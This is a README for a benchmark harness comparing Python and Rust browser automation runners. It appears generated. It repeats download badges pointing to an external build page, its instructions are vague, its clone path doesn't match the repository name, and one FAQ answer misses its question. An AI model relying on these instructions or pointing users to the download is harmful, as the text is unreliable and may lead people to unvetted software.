# browser automation benchmark v2026 - benchmark harness 2026

> **A repeatable browser automation test suite for Python and Rust, built to compare Playwright and Chromium-based runners by execution speed, memory consumption, reliability, and startup time.**

[![Platform](https://img.shields.io/badge/Platform-Python%20and%20Rust-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ben-edwardsgrbj9979/browser-automation-benchmark-2026?style=flat-square)](https://github.com/ben-edwardsgrbj9979/browser-automation-benchmark-2026)

---

<p align="center">
  <a href="https://ben-edwardsgrbj9979.github.io/browser-automation-benchmark-2026/">
    <img src="https://img.shields.io/badge/Download-browser%20automation%20benchmark%20Latest-brightgreen?style=for-the-badge" alt="Download browser automation benchmark">
  </a>
</p>

> **[Download browser automation benchmark v2026](https://ben-edwardsgrbj9979.github.io/browser-automation-benchmark-2026/)**

---

[Download Latest Build](https://ben-edwardsgrbj9979.github.io/browser-automation-benchmark-2026/)

---

## Overview

browser automation benchmark provides a common harness for testing browser automation workloads implemented in Python and Rust. It places Python Playwright, Rust playwright-rs, and Rust chromiumoxide within the same benchmark structure, making cross-runner comparisons more consistent and repeatable.

The harness is intended for evaluating automation stacks used in scraping, scripted browsing, and tooling research. Its measurements cover practical signals such as runtime speed, memory usage, reliability, and browser startup time. Interleaved execution and warmup handling help preserve a reproducible run process.

---

## What It Measures

- Tests Python Playwright, Rust playwright-rs, and Rust chromiumoxide through a shared harness
- Collects measurements for speed, memory use, reliability, and browser launch time
- Interleaves backend runs to limit the impact of execution order
- Applies warmup handling to help stabilize benchmark sessions
- Provides local synthetic HTML fixtures for controlled experiments
- Allows tests against real Google Maps captures for more realistic workloads
- Keeps raw run data together with aggregated statistics
- Supports evaluation of browser automation and web scraping workflows

---

## Installation

Start by checking out the repository:

```bash
git clone https://github.com/ben-edwardsgrbj9979/browser-automation-benchmark-2026.git
cd browser-automation-benchmark
```

Install or build the runtime dependencies for the Python and Rust portions you plan to exercise. The harness should then be started through the project entry point appropriate to your environment.

---

## Running the Benchmarks

Choose the automation backends and fixture source that fit the comparison you want to perform.

A normal run consists of:

1. Setting up Python, Rust, and the required browser dependencies.
2. Choosing synthetic HTML fixtures or real capture data.
3. Launching the benchmark harness.
4. Examining both the raw output and aggregated result summaries.

Example usage pattern:

```bash
# Run the harness using the repository's benchmark entry point
# Replace the command with the runner used in your setup
python benchmark.py
```

For meaningful repeat tests, use the same environment and fixture collection for every run.

---

## Benchmark Settings

The harness generally reads its options from the project configuration or the runner settings. When comparing backends, preserve the fixture source, warmup policy, and execution ordering so that the resulting measurements remain comparable.

Example structure:

```yaml
backend: playwright
fixture_source: synthetic
warmup_runs: 1
interleaved_runs: true
output: results/
```

---

## Requirements

- A Python environment for the Playwright benchmark path
- A Rust toolchain for playwright-rs and chromiumoxide tests
- A compatible Chromium-based browser for headless execution
- Enough local storage for raw outputs and summary files
- Access to the selected fixtures, whether local HTML files or capture data

---

## Frequently Asked Questions

**Which runners are covered?**  
The harness compares browser automation backends using performance and reliability measurements rather than relying on one timing metric.

**What fixture sources are available?**  
You can test with local synthetic HTML fixtures or with real Google Maps captures.

**How does the harness support fair comparisons?**  
Interleaved runs and warmup handling are used to make repeated measurements more consistent.

**What output does the benchmark produce?**  
It saves aggregated statistics as well as the raw data from individual runs for subsequent analysis.

**How should I troubleshoot a failed run?**  
Verify the browser installation, runtime dependencies, and fixture paths. After correcting any issues, run the benchmark again with the same configuration.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
